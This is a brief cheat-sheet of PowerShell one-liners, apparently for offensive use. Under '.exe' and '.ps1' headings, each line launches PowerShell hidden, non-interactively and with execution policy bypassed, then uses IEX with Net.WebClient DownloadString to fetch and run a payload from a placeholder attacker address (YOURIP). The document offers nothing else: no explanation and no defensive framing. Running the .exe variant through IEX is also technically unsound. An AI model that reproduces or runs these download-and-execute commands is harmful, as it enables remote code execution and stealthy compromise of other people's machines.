----For .exe----
Powershell -NoP -NonI -W Hidden -Exec Bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://YOURIP/payload.exe')"
OR
IEX(New-Object Net.WebClient).DownloadString('http://YOURIP/payload.exe')

----For .ps1----
Powershell -NoP -NonI -W Hidden -Exec Bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://YOURIP/payload.ps1')"
OR
IEX(New-Object Net.WebClient).DownloadString('http://YOURIP/payload.ps1')


